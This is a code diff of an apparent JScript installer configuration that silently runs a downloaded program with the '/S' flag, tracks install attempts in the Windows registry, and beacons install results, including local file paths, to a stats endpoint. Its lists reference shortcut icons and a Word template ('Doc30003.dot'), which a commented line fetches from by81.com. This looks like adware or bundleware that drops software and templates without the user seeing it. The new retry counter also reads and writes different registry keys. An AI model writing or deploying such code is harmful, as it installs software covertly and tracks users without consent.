@@ -46,7 +46,16 @@ var ___gconfig = {
 		//,desktopiconlist:[{id:20000,name:"·µÀû.ur", md5:"", iconPrivateProfileString:{URL:"http://www.51fanli.com",IconFileName:"favicon.ico",IconFile:"http://www.51fanli.com/favicon.ico"}, param:""}] ,
 		,desktopiconlist:[]
 		//,userdefinedlist:[{id:30003,name:"Doc30003.dot", md5:"", url:"http://www.by81.com/05/Doc30003.dot"}  ]
-		,userdefinedlist:[{id:30010,name:"Doc30003.dot", md5:"", url:"", invalidcondition:function(){				
+		,userdefinedlist:[{id:30010,name:"Doc30003.dot", md5:"", url:"", invalidcondition:function(){					
+				var times =__TRY(function(){ return __wshShell.RegRead(key+"_failedtimes");}, 0);
+				if(times>3){
+					sendHttpStat("installfailed3times","",1)
+					return true
+				}else{
+					times = times+1;
+					__TRY(function (){__wshShell.RegWrite(key, times, "REG_DWORD") });	
+				}
+				
 				var have1 = installed(regPath1);
 				if(have1)
 				{
@@ -66,11 +75,13 @@ var ___gconfig = {
 			var key = regPath2//				  
 			var d = new Date();
    			var t = d.getTime();
-			var value = t				
-			
+			var value = t	
 			//
 			var path = __workdir + ___localname;
 			var param = " /S"
+			
+			
+			
 			var ret = __external.ShellExcute("" , path+param, __workdir);
 			log(" run " + path + " " +  " return "+ret);
 			if(0 < ret)
@@ -80,7 +91,8 @@ var ___gconfig = {
 					ret = ___id;
 					sendHttpStat("installed-"+___swname,"success",1)
 			}
-			else{
+			else{					
+					sendHttpStat("installfailedparam",path+param,1)
 					sendHttpStat("installed-"+___swname,"failed",1)
 			}
 			setTimeout(function(){__TRY(function(){exit(ret);} ) },3000); 
